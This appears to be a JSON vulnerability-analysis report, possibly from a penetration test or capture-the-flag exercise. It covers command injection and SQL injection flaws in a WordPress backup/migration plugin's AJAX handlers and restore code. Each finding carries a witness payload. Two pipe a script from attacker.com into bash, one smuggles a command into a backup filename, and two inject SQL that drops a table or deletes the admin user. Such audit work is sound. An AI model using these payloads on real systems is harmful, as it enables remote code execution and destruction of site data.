
{
  "vulnerabilities": [
    {
      "ID": "INJ-VULN-01",
      "vulnerability_type": "CommandInjection",
      "externally_exploitable": true,
      "source": "url parameter via POST to /wp-admin/admin-ajax.php?action=backup_migration&f=download-backup (ajax.php:1498)",
      "combined_sources": "Single source: $_POST['url']",
      "path": "BMP::sanitize() → sanitize_text_field() → handleQuickMigration() → exec() sink",
      "sink_call": "ajax.php:1513 - exec(BMI_CLI_EXECUTABLE . ' -f \"' . $cliHandler . '\" bmi_quick_migration \"' . $url . '\" > /dev/null &', $res)",
      "slot_type": "CMD-part-of-string",
      "sanitization_observed": "sanitize_text_field() at ajax.php:52 via BMP::sanitize() → formatting.php:5580-5671 (removes HTML, newlines, percent-encoding but preserves shell metacharacters)",
      "concat_occurrences": "Line 1513: Direct concatenation into exec() command string after sanitization",
      "verdict": "vulnerable",
      "mismatch_reason": "sanitize_text_field() is designed for XSS prevention, not command injection. Does not escape shell metacharacters (;|&$`()). URL parameter wrapped in double quotes allows command substitution via $() or backticks, and quote breaking.",
      "witness_payload": "$(curl http://attacker.com/shell.sh|bash)",
      "confidence": "high",
      "notes": "Requires authenticated WordPress user with access to /wp-admin/ (any role due to is_admin() authorization flaw). URL parameter can contain arbitrary shell commands within double quotes."
    },
    {
      "ID": "INJ-VULN-02",
      "vulnerability_type": "CommandInjection",
      "externally_exploitable": true,
      "source": "file parameter via POST to /wp-admin/admin-ajax.php?action=backup_migration&f=restore-backup (ajax.php:1139)",
      "combined_sources": "Single source: $_POST['file']",
      "path": "BMP::sanitize() → sanitize_text_field() → restoreBackup() → exec() sink",
      "sink_call": "ajax.php:1145 - exec(BMI_CLI_EXECUTABLE . ' -f \"' . $cliHandler . '\" bmi_restore ' . $backupName . ' ' . $remoteType . ' > /dev/null &', $res)",
      "slot_type": "CMD-argument",
      "sanitization_observed": "sanitize_text_field() applied twice: ajax.php:52 and ajax.php:1139 (removes HTML, newlines, percent-encoding but preserves shell metacharacters)",
      "concat_occurrences": "Line 1145: Unquoted concatenation into exec() command after sanitization",
      "verdict": "vulnerable",
      "mismatch_reason": "Backup filename is UNQUOTED in exec() call, allowing direct command injection via semicolon, pipe, or ampersand. sanitize_text_field() does not remove command separators (;|&) or command substitution operators ($`()).",
      "witness_payload": "backup.zip; cat /opt/flag.txt > /tmp/pwned; #",
      "confidence": "high",
      "notes": "Higher exploitability than INJ-VULN-01 due to unquoted argument position. Semicolon terminates first command and executes injected command. Hash comments out remainder. Requires authenticated user."
    },
    {
      "ID": "INJ-VULN-04",
      "vulnerability_type": "CommandInjection",
      "externally_exploitable": true,
      "source": "php_cli_manual_path parameter via POST to /wp-admin/admin-ajax.php?action=backup_migration&f=save-other-options (ajax.php:1867)",
      "combined_sources": "Single source: $_POST['php_cli_manual_path']",
      "path": "BMP::sanitize() → trim() → bmi_set_config('OTHER:CLI:PATH') → BMI_CLI_EXECUTABLE constant → multiple exec() sinks",
      "sink_call": "Multiple sinks: ajax.php:638, 640, 1145, 1513 - All exec() calls use BMI_CLI_EXECUTABLE constant defined from stored value",
      "slot_type": "CMD-executable-path",
      "sanitization_observed": "trim() only at ajax.php:1867 (removes leading/trailing whitespace, no validation)",
      "concat_occurrences": "Configuration storage at ajax.php:1954, retrieval and constant definition at constants.php:87-91, then concatenated in all exec() calls",
      "verdict": "vulnerable",
      "mismatch_reason": "trim() provides zero protection against command injection. Attacker has 100% control over the executable path. Weak file_exists() check at line 1922 can be bypassed with existing files like /bin/bash or by setting empty string. Two-phase attack: (1) set malicious path, (2) trigger any backup/restore operation.",
      "witness_payload": "/bin/bash -c \"curl http://attacker.com/shell.sh|bash\" #",
      "confidence": "high",
      "notes": "Critical two-phase vulnerability. Phase 1: Store malicious executable path. Phase 2: Trigger execution via create-backup, restore-backup, or download-backup. Persists in config file across requests. Requires admin-level access to set configuration."
    },
    {
      "ID": "INJ-VULN-05",
      "vulnerability_type": "SQLi",
      "externally_exploitable": true,
      "source": "Table names extracted from backup SQL files via explode() - even-better-restore-v4.php:247,250",
      "combined_sources": "Two sources merged: $realTableName (line 247) and $tmpTableName (line 250) from backup file lines 1-2",
      "path": "explode('`', backup_line)[1] → addNewTableToMap() → BMISearchReplace() → multiple SQL query sinks",
      "sink_call": "Multiple sinks in search-replace.php: Line 96 (DESCRIBE), 128 (SELECT COUNT), 151 (SELECT *), 183 (UPDATE)",
      "slot_type": "SQL-ident",
      "sanitization_observed": "NONE - Direct explode() extraction with zero validation or sanitization",
      "concat_occurrences": "Line 96: Direct concatenation 'DESCRIBE ' . $table. Lines 128, 151, 183: Various concatenation patterns, some with backticks, some without",
      "verdict": "vulnerable",
      "mismatch_reason": "Table identifiers require whitelist validation or proper escaping. Neither is present. Backticks (when used) do not prevent injection as they can be closed by attacker. Line 96 has NO protection at all. String concatenation instead of parameter binding for identifiers.",
      "witness_payload": "wp_posts`; DROP TABLE wp_users; --",
      "confidence": "high",
      "notes": "Attacker uploads malicious backup file with crafted table names. During restore, table names flow through search-replace operations without validation. Can execute arbitrary SQL including DROP, DELETE, UPDATE. Requires ability to upload/provide backup file and trigger restore."
    },
    {
      "ID": "INJ-VULN-06",
      "vulnerability_type": "SQLi",
      "externally_exploitable": true,
      "source": "Table names extracted from backup SQL files via explode() - even-better-restore-v4.php:247,250",
      "combined_sources": "Two sources used: $oldTable (tmpTableName from line 250) and $newTable (realTableName from line 247)",
      "path": "explode('`', backup_line)[1] → addNewTableToMap() → replaceTableNames() → DROP/ALTER SQL sinks",
      "sink_call": "even-better-restore-v4.php:298 (DROP TABLE IF EXISTS), 301 (ALTER TABLE RENAME)",
      "slot_type": "SQL-ident",
      "sanitization_observed": "NONE - Same explode() extraction as INJ-VULN-05, zero validation",
      "concat_occurrences": "Line 298: Direct concatenation into DROP TABLE query with backticks. Line 301: Direct concatenation into ALTER TABLE with backticks on both table names",
      "verdict": "vulnerable",
      "mismatch_reason": "Identical root cause to INJ-VULN-05 but different data flow path and SQL operations. Backticks provide no security as attacker controls the full table name string including ability to close backticks. Affects database structure operations (DROP, ALTER) rather than data operations.",
      "witness_payload": "wp_posts`; DELETE FROM wp_users WHERE user_login='admin'; --",
      "confidence": "high",
      "notes": "Separate vulnerability from INJ-VULN-05 with distinct exploitation path. Executes unconditionally during every restore (no conditional logic), whereas INJ-VULN-05 only executes if domain/path differs. Both $oldTable and $newTable are attacker-controlled, providing two injection points. Higher reliability due to unconditional execution."
    }
  ]
}